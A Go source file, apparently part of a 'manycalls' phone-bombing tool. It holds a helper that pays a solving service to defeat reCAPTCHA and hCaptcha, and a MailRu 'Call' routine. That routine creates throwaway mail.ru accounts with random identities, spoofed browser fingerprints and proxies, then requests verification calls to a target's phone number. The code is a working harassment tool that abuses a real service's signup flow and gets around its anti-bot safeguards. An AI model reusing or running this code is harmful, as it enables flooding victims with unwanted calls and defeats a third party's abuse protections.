package services

import (
	crypto_rand "crypto/rand"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"regexp"
	"strconv"
	"time"

	"manycalls/pkg/requests"
)

const symbols = "ABCDEFGHIJKLMNOPQRSTYVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

func randStr(length int64, chars string) string {
	// Создание рандомной строки; первое значение - длина, второе - используемые символы в строке.

	var out string
	var i int64
	var b [8]byte

	for i != length {
		// Генерируем радномный сид
		_, err := crypto_rand.Read(b[:])
		if err != nil {
			panic("cannot seed math/rand package with cryptographically secure random number generator")
		}
		rand.Seed(int64(binary.LittleEndian.Uint64(b[:])))

		// Генерируем рандомную цифру от 0 до длины нашей будущей строки
		num := rand.Intn(len(chars))

		// Вставляем её в строку
		out += string(chars[num])

		i++
	}
	return out

}

func randInt(min int, max int) int {

	var b [8]byte

	_, err := crypto_rand.Read(b[:])

	if err != nil {
		panic("cannot seed math/rand package with cryptographically secure random number generator")
	}

	rand.Seed(int64(binary.LittleEndian.Uint64(b[:])))
	num := rand.Intn(max-min) + min

	return num

}

// Captcha solve recaptcha2 and hcaptcha(CaptchaGuru service).
func Captcha(key string, googlekey string, url string, invisible string, method string) (string, error) {
	client, _, err := requests.MakeClient("")
	if err != nil {
		return "", err
	}
	request := requests.NewRequest(client)

	if method == "recaptcha2" {
		a, _, _ := request.Get("http://api.captcha.guru/in.php?key="+key+"&method=userrecaptcha&googlekey="+googlekey+"&invisible="+invisible+"&pageurl="+url, map[string]string{})
		fmt.Println(string(a))
		re := regexp.MustCompile(`\d+`)
		recaptchaID := re.FindAllString(string(a), -1)
		fmt.Println(recaptchaID[0])
		a, _, _ = request.Get("http://api.captcha.guru/res.php?key="+key+"&action=get&id="+recaptchaID[0], map[string]string{})

		for string(a) == "CAPCHA_NOT_READY" {
			time.Sleep(5 * time.Second)
			a, _, _ = request.Get("http://api.captcha.guru/res.php?key="+key+"&action=get&id="+recaptchaID[0], map[string]string{})
		}
		fmt.Println(string(a))
		if string(a) == "ERROR_CAPTCHA_UNSOLVABLE" {
			return "", errors.New("ERROR_CAPTCHA_UNSOLVABLE")
		}
		re = regexp.MustCompile(`OK\|(\S+)$`)
		captchaToken := re.FindStringSubmatch(string(a))
		fmt.Println(captchaToken)
		return captchaToken[1], nil

	} else if method == "hcaptcha" {

		a, _, _ := request.Get("http://api.captcha.guru/in.php?key="+key+"&method=hcaptcha&sitekey="+googlekey+"&pageurl="+url, map[string]string{})
		re := regexp.MustCompile(`\d+`)
		recaptchaID := re.FindAllString(string(a), -1)
		fmt.Println(recaptchaID[0])
		a, _, _ = request.Get("http://api.captcha.guru/res.php?key="+key+"&action=get&id="+recaptchaID[0], map[string]string{})

		for string(a) == "CAPCHA_NOT_READY" {
			time.Sleep(5 * time.Second)
			a, _, _ = request.Get("http://api.captcha.guru/res.php?key="+key+"&action=get&id="+recaptchaID[0], map[string]string{})

		}

		re = regexp.MustCompile(`OK\|(\S+)$`)
		captchaToken := re.FindStringSubmatch(string(a))
		fmt.Println(captchaToken)
		return captchaToken[1], nil
	}
	return "", errors.New("Type another method")
}

// MailRu service. Take CaptchaGuru token.
type MailRu struct {
	token      string
	SignUpJSON struct {
		Body struct {
			Additional struct {
				Callui  bool `json:"callui"`
				Captcha struct {
					Options struct {
						Sitekey string `json:"sitekey"`
					} `json:"options"`
					Type string `json:"type"`
				} `json:"captcha"`
			} `json:"additional"`
			Token string `json:"token"`
		} `json:"body"`
		Email       interface{} `json:"email"`
		Status      int         `json:"status"`
		Htmlencoded bool        `json:"htmlencoded"`
	}
}

// NewMailRu create MailRu struct.
func NewMailRu(token string) *MailRu {
	return &MailRu{token: token}
}

// Call make call to phone.
func (m *MailRu) Call(phone string, proxy string, index string) error {
	mailLogin := randStr(10, symbols)

	_, clientCookie, err := requests.MakeClient(proxy)
	if err != nil {
		return err
	}

	request := requests.NewRequest(clientCookie)

	dataHead := map[string]string{
		"extended":               "true",
		"more_password_strength": "1",
		"context":                "signup",
		"browser":                `{"screen":{"availWidth":"1920","availHeight":"` + randStr(4, "0123456789") + `","width":"1920","height":"1080","colorDepth":"24","pixelDepth":"24","availLeft":"0","availTop":"0"},"navigator":{"userAgent":"Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36","appVersion":"5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36","platform":"Android","vendor":"","product":"WebKit","oscpu":"Android 9","productSub":"","vendorSub":"","maxTouchPoints":"0","doNotTrack":"inaccessible","hardwareConcurrency":"6","cookieEnabled":"true","appCodeName":"Mozilla","appName":"Netscape","language":"en","onLine":"true","webdriver":"false","deviceMemory":"8"},"flash":{"version":"inaccessible"}}`,
		"from":                   "main_m_touch",
		"sent_me_ads":            "true",
		"sent_me_ads_common":     "true",
		"name":                   `{"first":"` + randStr(int64(randInt(4, 8)), "ABCDEFGHIJKLMNOPQRSTYVWXYZabcdefghijklmnopqrstuvwxyz0123456789") + `","last":"` + randStr(int64(randInt(4, 8)), "ABCDEFGHIJKLMNOPQRSTYVWXYZabcdefghijklmnopqrstuvwxyz0123456789") + `"}`,
		"birthday":               `{"day":` + strconv.Itoa(randInt(4, 29)) + `,"month":` + strconv.Itoa(randInt(1, 12)) + `,"year":` + strconv.Itoa(randInt(1970, 2002)) + `}`,
		"sex":                    "male",
		"login":                  mailLogin,
		"domain":                 "mail.ru",
		"password":               randStr(16, "ABCDEFGHIJKLMNOPQRSTYVWXYZabcdefghijklmnopqrstuvwxyz0123456789"),
		"phones":                 `[{"phone":"` + phone + `","mobile":true}]`,
		"utm":                    `{"source":"","medium":"","campaign":"","term":"","content":""}`,
		"referrer":               "https://mail.ru/",
	}

	data, contentType, err := requests.MakeBoundary(randStr(16, symbols), dataHead)
	if err != nil {
		log.Fatal(err)
	}

	headers := map[string]string{
		`Host`:             `account.mail.ru`,
		`Connection`:       `keep-alive`,
		`Accept`:           `application/json, text/plain, */*`,
		`X-Requested-With`: `XMLHttpRequest`,
		`User-Agent`:       `Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36`,
		`X-Request-Id`:     randStr(8, "abcdefghijklmnopqrstuvwxyz0123456789") + randStr(4, "abcdefghijklmnopqrstuvwxyz0123456789") + randStr(4, "abcdefghijklmnopqrstuvwxyz0123456789") + randStr(4, "0123456789") + randStr(12, "abcdefghijklmnopqrstuvwxyz0123456789"),
		`Content-Type`:     contentType,
		`Origin`:           `https://account.mail.ru`,
		`Sec-Fetch-Site`:   `same-origin`,
		`Sec-Fetch-Mode`:   `cors`,
		`Sec-Fetch-Dest`:   `empty`,
		`Referer`:          `https://account.mail.ru/signup?from=main_m_touch`,
		`Accept-Encoding`:  `gzip, deflate, br`,
		`Accept-Language`:  `en`,
	}

	body, _, err := request.Post("https://account.mail.ru/api/v1/user/signup", headers, data)
	if err != nil {
		return err
	}

	fmt.Println(index + "!!!" + string(body))

	if string(body) == `{"email":null,"body":"user","status":403,"htmlencoded":true}` {
		return nil
	}

	err = json.Unmarshal(body, &m.SignUpJSON)
	if err != nil {
		return err
	}

	tokenForCall := m.SignUpJSON.Body.Token
	googleKey := m.SignUpJSON.Body.Additional.Captcha.Options.Sitekey

	captchaToken, err := Captcha(m.token, googleKey, "https://account.mail.ru/signup?from=main_m_touch", "1", "recaptcha2")
	if err != nil {
		return err
	}

	dataHead = map[string]string{
		"reg_token":   `{"id":"` + tokenForCall + `","transport":"phone","index":0,"target":"user/signup","format":"only_code"}`,
		"email":       mailLogin + "@mail.ru",
		"callui":      "true",
		"from":        "main_m_touch",
		"recaptcha":   captchaToken,
		"lang":        "ru_RU",
		"htmlencoded": "false",
		"utm":         "{}",
	}

	data, contentType, err = requests.MakeBoundary(randStr(16, symbols), dataHead)
	if err != nil {
		return err
	}
	print(index + " Отправляю второй запрос")

	headers = map[string]string{
		"Connection":         "close",
		"sec-ch-ua":          `" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"`,
		"sec-ch-ua-mobile":   "?0",
		"User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
		"Content-Type":       contentType,
		"Accept":             "application/json, text/plain, */*",
		"X-Requested-With":   "XMLHttpRequest",
		`X-Request-Id`:       randStr(8, "abcdefghijklmnopqrstuvwxyz0123456789") + randStr(4, "abcdefghijklmnopqrstuvwxyz0123456789") + randStr(4, "abcdefghijklmnopqrstuvwxyz0123456789") + randStr(4, "0123456789") + randStr(12, "abcdefghijklmnopqrstuvwxyz0123456789"),
		"Host":               "account.mail.ru",
		"sec-ch-ua-platform": "Windows",
		"Origin":             "https://account.mail.ru",
		"Sec-Fetch-Site":     "same-origin",
		"Sec-Fetch-Mode":     "cors",
		"Sec-Fetch-Dest":     "empty",
		"Referer":            "https://account.mail.ru/signup?from=main_m_touch",
		"Accept-Encoding":    "gzip, deflate",
		"Accept-Language":    "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
	}

	body, _, err = request.Post("https://account.mail.ru/api/v1/tokens/send", headers, data)
	if err != nil {
		return err
	}

	fmt.Println(index + "!!!" + string(body))

	if string(body) == `{"email":null,"body":"user","status":403,"htmlencoded":true}` {
		return nil
	}

	return nil
}
